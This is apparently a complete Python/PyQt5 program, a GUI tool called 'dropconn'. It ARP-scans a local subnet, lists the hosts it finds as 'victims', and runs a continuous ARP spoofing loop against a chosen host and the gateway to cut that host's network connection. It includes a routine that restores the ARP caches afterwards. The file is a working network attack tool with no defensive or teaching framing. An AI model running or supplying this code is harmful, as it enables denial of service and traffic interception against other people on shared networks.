from ui.gui_dropconn import *
from PyQt5 import QtWidgets, QtCore, QtGui
from re import match
from threading import Thread
import scapy.all as scapy

def scan(ip):
    arp_req_frame = scapy.ARP(pdst = ip)

    broadcast_ether_frame = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")
    
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame

    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout = 1, verbose = False)[0]
    result = []
    for i in range(0,len(answered_list)):
        client_dict = {"ip" : answered_list[i][1].psrc, "mac" : answered_list[i][1].hwsrc}
        result.append(client_dict)
    return result

def gen_ips(target):
    
    ips = []
    target_root = match(r'\d+\.\d+\.\d+\.', target).group()
    for i in range(0, 256):
        ips.append(target_root+str(i))
    return ips

def get(ip, begin, end):
    
    goods = []

    for ip in gen_ips(ip)[int(begin):int(end)]:
        result = scan(ip)
        if result:
            
            goods.append(result[0])
    return goods

class DropThread(Thread):

    def __init__(self, ti, gi):
        super().__init__()
        self.ti = ti
        self.gi = gi
        self.work = True

    def get_mac_by_ip(self, ip):
        while True:
            try:
                arp_request = scapy.ARP(pdst=ip)
                broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
                arp_request_broadcast = broadcast / arp_request
    
                ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
                return ans[0][1].hwsrc
            except IndexError:
                continue

    def spoof(self, target_ip, spoof_ip):
        target_mac = self.get_mac_by_ip(target_ip)
        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        scapy.send(packet, verbose=False)

    def spoof_loop(self, target_ip, gateway_ip):
        while self.work:
            self.spoof(target_ip, gateway_ip)
            self.spoof(gateway_ip, target_ip)

    def run(self):
        self.spoof_loop(self.ti, self.gi)

def get_mac_by_ip(ip):
        while True:
            try:
                arp_request = scapy.ARP(pdst=ip)
                broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
                arp_request_broadcast = broadcast / arp_request
    
                ans = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
                return ans[0][1].hwsrc
            except IndexError:
                continue


def restore(dest_ip, source_ip):
    package = scapy.ARP(
        op=2,
        pdst=dest_ip,
        hwdst=get_mac_by_ip(dest_ip),
        psrc=source_ip,
        hwsrc=get_mac_by_ip(source_ip)
    )
    scapy.send(package, count=4, verbose=False)

class Root(QtWidgets.QMainWindow ,Ui_MainWindow):

    def __init__(self) -> None:
        super().__init__()
        self.setupUi(self)
        Root.show(self)

        self.model = QtGui.QStandardItemModel()

        self.scan_button.setText("S\nC\nA\nN")
        self.scan_button.clicked.connect(lambda: self.scan_event())
        self.drop_button.clicked.connect(lambda: self.drop_event())
        self.stop_button.clicked.connect(lambda: self.stop_event())

        self.floor_edit.setText("64")
        self.ceil_edit.setText("68")
        self.gateway_edit.setText("192.168.1.1")

    
    def scan_event(self):
        self.model.clear()
        gateway_ip = self.gateway_edit.text()
        begin = self.floor_edit.text()
        end = self.ceil_edit.text()
        result = get(gateway_ip, begin, end)
        
        
        self.victims_list.setModel(self.model)

        for victim in result:
            item = QtGui.QStandardItem(victim['ip'])
            self.model.appendRow(item)
            
    def update_status(self, text):
        self.status_label.setText(text)                    
            

    def drop_event(self):
        item_index = self.victims_list.currentIndex()
        victim_ip = self.model.itemFromIndex(item_index).text()
        self.drop_thread = DropThread(victim_ip, self.gateway_edit.text())
        self.drop_thread.start()
        self.update_status(f"Dropping:\n{victim_ip}")

        self.ti = victim_ip
        self.gi = self.gateway_edit.text()

    def stop_event(self):
        self.drop_thread.work = False
        restore(dest_ip=self.ti, source_ip=self.gi)
        restore(self.gi, self.ti)
        self.update_status(f"Stopped")
        

    

    



        



if __name__ == "__main__":
    import sys
    app = QtWidgets.QApplication(sys.argv)
    ui = Root()
    sys.exit(app.exec_())
